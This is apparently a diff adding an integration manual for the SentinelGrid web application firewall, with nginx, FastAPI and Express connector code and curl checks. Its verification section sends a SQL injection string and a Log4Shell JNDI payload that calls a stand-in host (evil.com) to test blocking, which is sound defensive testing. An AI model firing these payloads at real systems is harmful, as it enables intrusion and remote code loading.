@@ -1,0 +1,168 @@
+================================================================================
+SENTINELGRID WAAP // CONNECT ANY SITE FOR OBSERVATION & IN-LINE INSPECTION
+================================================================================
+Document: Production Connector & Reverse Proxy Integration Manual
+Target Latency Overhead: < 1.5ms Sub-Request Budget
+Default Inspection Route: POST http://<sentinelgrid-host>:8000/v1/inspect
+Default Heartbeat Route:  POST http://<sentinelgrid-host>:8000/v1/connectors/heartbeat
+================================================================================
+
+1. WHAT IS REQUIRED TO OBSERVE & PROTECT ANY WEBSITE
+--------------------------------------------------------------------------------
+To connect any website, application, or API to SentinelGrid:
+- You DO NOT need to modify your database or change your backend architecture.
+- SentinelGrid evaluates incoming HTTP traffic in-line via a fast subrequest.
+- If SentinelGrid responds with action "ALLOW" (HTTP 200), traffic passes to your app.
+- If SentinelGrid detects an attack, it responds with action "BLOCK" (HTTP 403).
+- Any endpoint hit by live traffic that was not documented in an OpenAPI contract
+  is automatically flagged in the SentinelGrid console as a "SHADOW" API.
+
+--------------------------------------------------------------------------------
+2. NGINX REVERSE PROXY INTEGRATION (RECOMMENDED FOR PRODUCTION)
+--------------------------------------------------------------------------------
+Add the following to your site's nginx configuration:
+
+upstream my_backend_app {
+    server 127.0.0.1:3000;
+    keepalive 32;
+}
+
+upstream sentinelgrid_engine {
+    server 127.0.0.1:8000;
+    keepalive 32;
+}
+
+server {
+    listen 80;
+    server_name api.yourdomain.com;
+
+    location / {
+        # Check request against SentinelGrid before proxying
+        auth_request /_sentinelgrid_eval;
+
+        proxy_pass http://my_backend_app;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    }
+
+    location = /_sentinelgrid_eval {
+        internal;
+        proxy_pass http://sentinelgrid_engine/v1/inspect;
+        proxy_pass_request_body on;
+        proxy_set_header Content-Type "application/json";
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_connect_timeout 30ms;
+        proxy_read_timeout 50ms;
+    }
+
+    error_page 403 /_sentinel_blocked.json;
+    location = /_sentinel_blocked.json {
+        internal;
+        default_type application/json;
+        return 403 '{"error":"Forbidden","message":"Blocked by SentinelGrid WAAP"}';
+    }
+}
+
+--------------------------------------------------------------------------------
+3. PYTHON FASTAPI / STARLETTE MIDDLEWARE INTEGRATION
+--------------------------------------------------------------------------------
+In your Python application:
+
+from fastapi import FastAPI, Request
+from starlette.middleware.base import BaseHTTPMiddleware
+from starlette.responses import JSONResponse
+import httpx
+
+class SentinelGridMiddleware(BaseHTTPMiddleware):
+    def __init__(self, app, control_plane_url="http://127.0.0.1:8000"):
+        super().__init__(app)
+        self.inspect_url = f"{control_plane_url}/v1/inspect"
+        self.client = httpx.AsyncClient(timeout=0.05)
+
+    async def dispatch(self, request: Request, call_next):
+        client_ip = request.headers.get("x-real-ip") or request.client.host
+        body_bytes = await request.body()
+        
+        # Non-destructive body receive
+        async def receive():
+            return {"type": "http.request", "body": body_bytes}
+        request = Request(request.scope, receive=receive)
+
+        try:
+            res = await self.client.post(self.inspect_url, json={
+                "website_id": "default-site",
+                "method": request.method,
+                "path": request.url.path,
+                "query_params": request.url.query,
+                "body": body_bytes.decode("utf-8", errors="ignore")[:4096],
+                "headers": dict(request.headers),
+                "client_ip": client_ip
+            })
+            if res.status_code == 200 and res.json().get("action") == "BLOCK":
+                return JSONResponse(status_code=403, content={"error": "Blocked by SentinelGrid"})
+        except Exception:
+            pass # Fail-open: keep app alive if WAAP is unreachable
+
+        return await call_next(request)
+
+app = FastAPI()
+app.add_middleware(SentinelGridMiddleware)
+
+--------------------------------------------------------------------------------
+4. NODE.JS EXPRESS MIDDLEWARE INTEGRATION
+--------------------------------------------------------------------------------
+const axios = require('axios');
+
+function sentinelGridMiddleware(req, res, next) {
+  const clientIp = req.headers['x-real-ip'] || req.socket.remoteAddress;
+
+  axios.post('http://127.0.0.1:8000/v1/inspect', {
+    website_id: 'default-site',
+    method: req.method,
+    path: req.path,
+    query_params: new URLSearchParams(req.query).toString(),
+    body: typeof req.body === 'string' ? req.body : JSON.stringify(req.body || {}),
+    headers: req.headers,
+    client_ip: clientIp
+  }, { timeout: 50 })
+  .then(response => {
+    if (response.data && response.data.action === 'BLOCK') {
+      return res.status(403).json({ error: 'Blocked by SentinelGrid WAAP' });
+    }
+    next();
+  })
+  .catch(() => {
+    next(); // Fail-open: guarantee uptime
+  });
+}
+
+// In your app:
+// app.use(sentinelGridMiddleware);
+
+--------------------------------------------------------------------------------
+5. QUICK VERIFICATION COMMANDS (CURL TESTS)
+--------------------------------------------------------------------------------
+Test 1: Normal Legitimate Traffic (Should return ALLOW, HTTP 200):
+curl -i -X POST http://localhost:8000/v1/inspect \
+  -H "Content-Type: application/json" \
+  -d '{"method":"GET","path":"/api/v1/products","query_params":"id=10","client_ip":"192.168.1.1"}'
+
+Test 2: SQL Injection Attempt (Should return BLOCK, HTTP 403):
+curl -i -X POST http://localhost:8000/v1/inspect \
+  -H "Content-Type: application/json" \
+  -d '{"method":"POST","path":"/login","body":"admin'\'' OR 1=1 --","client_ip":"198.51.100.88"}'
+
+Test 3: Log4Shell Exploit (Should return BLOCK, HTTP 403):
+curl -i -X POST http://localhost:8000/v1/inspect \
+  -H "Content-Type: application/json" \
+  -d '{"method":"GET","path":"/","headers":{"user-agent":"${jndi:ldap://evil.com/x}"},"client_ip":"203.0.113.1"}'
+
+--------------------------------------------------------------------------------
+6. CONNECTOR HEARTBEAT
+--------------------------------------------------------------------------------
+Send this ping from your reverse proxy or connector every 60s to register status:
+curl -X POST http://localhost:8000/v1/connectors/heartbeat \
+  -H "Content-Type: application/json" \
+  -d '{"website_id":"default-site","connector_name":"Nginx-Proxy-01","connector_type":"nginx","latency_ms":0.8}'
+================================================================================
